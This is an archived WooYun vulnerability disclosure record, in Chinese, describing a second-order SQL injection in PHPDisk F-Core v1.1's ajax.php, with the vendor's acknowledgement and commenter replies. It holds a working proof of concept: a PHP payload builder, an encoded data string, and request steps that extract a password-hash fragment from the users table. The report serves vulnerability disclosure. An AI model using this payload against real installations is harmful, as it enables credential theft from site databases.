{"id": 52591, "wybug_id": "wooyun-2014-070754", "wybug_title": "PHPDisk F-Core v1.1 曲折实现的二次注入", "wybug_corp": "phpdisk.com", "wybug_author": "飞扬风", "wybug_date": "2014-08-05 16:29", "wybug_open_date": "2014-11-03 16:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-03：\t细节向公众公开  简要描述： 发现二次注入比较明显，由于不报错，加上注入点位置比较奇葩，利用起来颇费周折~可能是技术不过关没有想到更好的利用办法了~ 详细说明：  二次注入是在ajax.php中发生的主要流程是uploadcloud时在写入的内容，在save_as时被读取，但是没有进行过滤，造成了二次注入来具体看看代码，首先是uploadcloud\ncase 'uploadCloud':\t\t$folder_id = (int)gpc('folder_id','P',0);\t\t$folder_id = $folder_id ? $folder_id : -1;\t\t$data = trim(gpc('data','P',''));\t\t$is_checked = $is_public ? ($settings['check_public_file'] ? 0 :1) : 1;\t\tif($settings['all_file_share']){\t\t\t$in_share = 1;\t\t}else{\t\t\t$in_share = (int)@$db->result_first(\"select in_share from {$tpf}folders where userid='$pd_uid' and folder_id='$folder_id'\");\t\t}\t\tif($data){\t\t\t$file_key = random(8);\t\t\tif(strpos($data,',')!==false){\t\t\t\t$add_sql = $msg = '';\t\t\t\t$arr = explode(',',$data);\t\t\t\tfor($i=0;$i<count($arr)-1;$i++){\t\t\t\t\t$file = unserialize(base64_decode($arr[$i]));\t\t\t\t\t$file[file_id] = (int)$file[file_id];\t\t\t\t\t$file[file_size] = (int)$file[file_size];\t\t\t\t\t$file[file_description] = $db->escape(trim($file[file_description]));\t\t\t\t\t$file[file_extension] = $db->escape(trim($file[file_extension]));\t\t\t\t\t$file[file_name] = $db->escape(trim($file[file_name]));\t\t\t\t\t$report_status =0;\t\t\t\t\t$report_arr = explode(',',$settings['report_word']);\t\t\t\t\tif(count($report_arr)){\t\t\t\t\t\tforeach($report_arr as $value){\t\t\t\t\t\t\tif (strpos($file['file_name'],$value) !== false){\t\t\t\t\t\t\t\t$report_status = 2;\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t\t$num = @$db->result_first(\"select count(*) from {$tpf}files where yun_fid='{$file[file_id]}' and userid='$pd_uid'\");\t\t\t\t\tif($num && $file[file_id]){\t\t\t\t\t\t$tmp_ext = $file[file_extension] ? '.'.$file[file_extension] : '';\t\t\t\t\t\t$msg .=\t$file[file_name].$tmp_ext.',';\t\t\t\t\t}else{\t\t\t\t\t\t$add_sql .= \"({$file[file_id]},'{$file[file_name]}','$file_key','{$file[file_extension]}','application/octet-stream','{$file[file_description]}','{$file[file_size]}','$timestamp','$is_checked','$in_share','$report_status','$pd_uid','$folder_id','$onlineip'),\";\t\t\t\t\t}\t\t\t\t}\t\t\t\tif($add_sql){\t\t\t\t\t$add_sql = is_utf8() ? $add_sql : convert_str('utf-8','gbk',$add_sql);\t\t\t\t\t$add_sql = substr($add_sql,0,-1);\t\t\t\t\t$db->query_unbuffered(\"insert into {$tpf}files(yun_fid,file_name,file_key,file_extension,file_mime,file_description,file_size,file_time,is_checked,in_share,report_status,userid,folder_id,ip) values $add_sql ;\");\t\t\t\t}\t\t\t}\n虽然data使用base64加密，并且serialize，但是重新读入的时候都做了escape处理，确保了该函数不会有注入继续看下save_as\ncase 'save_as':\t\t$file_id = (int)gpc('file_id','G',0);\t\tif($pd_uid){\t\t\t$rs = $db->fetch_one_array(\"select * from {$tpf}files where file_id='$file_id' limit 1\");\t\t\tif($rs){\t\t\t\t$has_file = @$db->result_first(\"select count(*) from {$tpf}files where file_name='{$rs[file_name]}' and file_extension='{$rs[file_extension]}' and file_size='{$rs[file_size]}' and userid='$pd_uid' limit 1\");\t//注入点1\t\t\t\tif(($rs['userid'] ==$pd_uid) || $has_file){\t\t\t\t\t$rtn ='ufile';\t\t\t\t}else{\t\t\t\t\t$ins = array(\t\t\t\t\t'file_name' => '[转]'.$rs['file_name'],\t\t\t\t\t'file_key' => random(8),\t\t\t\t\t'file_extension' => $rs['file_extension'],\t\t\t\t\t'is_image' => $rs['is_image'],\t\t\t\t\t'file_mime' => $rs['file_mime'],\t\t\t\t\t'file_description' => $rs['file_description'],\t\t\t\t\t'file_store_path' => $rs['file_store_path'],\t\t\t\t\t'file_real_name' => $rs['file_real_name'],\t\t\t\t\t'file_md5' => $rs['file_md5'],\t\t\t\t\t'server_oid' => $rs['server_oid'],\t\t\t\t\t'file_size' => $rs['file_size'],\t\t\t\t\t'file_time' => $timestamp,\t\t\t\t\t'in_share' => 1,\t\t\t\t\t'is_checked' => $rs['is_checked'],\t\t\t\t\t'userid' => $pd_uid,\t\t\t\t\t'ip' => get_ip(),\t\t\t\t\t);\t\t\t\t\t$db->query_unbuffered(\"insert into {$tpf}files set \".$db->sql_array($ins).\"\");\t//注入点2\t\t\t\t\t$rtn = 'true';\t\t\t\t}\t\t\t}\t\t\tunset($rs);\t\t}else{\t\t\t$rtn = 'false';\t\t}\t\techo $rtn;\t\tbreak;\n其中有两个注入点，都是因为对rs的数据没有过滤造成的由于这套系统没有显示mysql错误，因此注入点1的select查询只能进行盲注，这样的话需要次数比较多，比较麻烦，所以考虑通过注入点2的insert进行注入，看能否直接爆出数据这个时候就出现了问题，要让语句先通过第一个select语句不报错才能进入注入点2看了一下，注入点1中只用了3个参数name，size，extension，还有一个description是我们可控的参数，那么如果我们通过description进行注入，就能成功通过注入点1到达注入点2先调用uploadcloud，在description中写入单引号，然后换一个帐号（一定要换个帐号！）调用save_as，调出调试信息看一下语句，像是这样\n\n可以发现二次注入确实存在，但是注入点的位置很尴尬，能在页面中显示的name字段在注入点之前，其他能显示的字段就剩下description本身那么想在name处直接爆信息是不可能了，description已经有了一个单引号，导致\nupdate set description = (select xxx)\n这样的方式也不可能了首先想到了一个解决方案，用类似盲注的方法，看图\n\n通过这种方式，将password每一位都爆在description处，直接查看，总共需要32次，比盲注好了不少，不过还是不够给力所以又想到了方案2，还是看图\n\n用hex的方式，可以爆多位内容了，离成功更近了一步，不过尝试爆password的时候，问题出现了\n\n由于password是md5，应该是32位，而hex后应该是64位，果断太长了最终折中的方案是，32位的password通过分段来爆，每次最多爆7位，这样最少只要5次就解决了\n\n水平有限，只能这样了~   漏洞证明：  以爆前password的前7位来证明，首先登陆帐号A，进行uploadcloud的操作\n<?php \t$file[file_description] = \"0'+substr(hex((SELECT password from pd_users limit 0,1)),1,14)+'0\";\t$file[file_name] = \"1\";\t$file[file_size] = \"1\";\t$file[file_extension] = \"1\";\techo base64_encode(serialize($file));?>\n通过代码，得到data的值为YTo0OntzOjE2OiJmaWxlX2Rlc2NyaXB0aW9uIjtzOjY1OiIwJytzdWJzdHIoaGV4KChTRUxFQ1QgcGFzc3dvcmQgZnJvbSBwZF91c2VycyBsaW1pdCAwLDEpKSwxLDE0KSsnMCI7czo5OiJmaWxlX25hbWUiO3M6MToiMSI7czo5OiJmaWxlX3NpemUiO3M6MToiMSI7czoxNDoiZmlsZV9leHRlbnNpb24iO3M6MToiMSI7fQ==\nhttp://localhost/phpdisk-f/ajax.php?action=uploadCloudpost：folder_id=2&data=YTo0OntzOjE2OiJmaWxlX2Rlc2NyaXB0aW9uIjtzOjY1OiIwJytzdWJzdHIoaGV4KChTRUxFQ1QgcGFzc3dvcmQgZnJvbSBwZF91c2VycyBsaW1pdCAwLDEpKSwxLDE0KSsnMCI7czo5OiJmaWxlX25hbWUiO3M6MToiMSI7czo5OiJmaWxlX3NpemUiO3M6MToiMSI7czoxNDoiZmlsZV9leHRlbnNpb24iO3M6MToiMSI7fQ==,\nfolder_id是已创建的文件夹id\n\n看下文件已经创建了，并且文件id为7（看链接就知道）\n\n\n切换到帐号B，访问http://localhost/phpdisk-f/ajax.php?action=save_as&file_id=7\n看下文件管理，成功爆出数据了\n\n   修复方案：  注意二次注入的问题   版权声明：转载请注明来源 飞扬风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-08-05 16:57 厂商回复： 感谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-26 16:02 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  http://www.2cto.com/Article/201303/193038.html M老湿的    \n     2014-08-27 20:26 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  太麻烦了   而且一些Hex后也会还有字母把 还是推荐用conv 直接Hex转10    \n     2014-08-28 00:19 |    \t\t飞扬风 \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:125        | 追求安全，热爱技术)\t\t \n  @′  雨。 受教了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}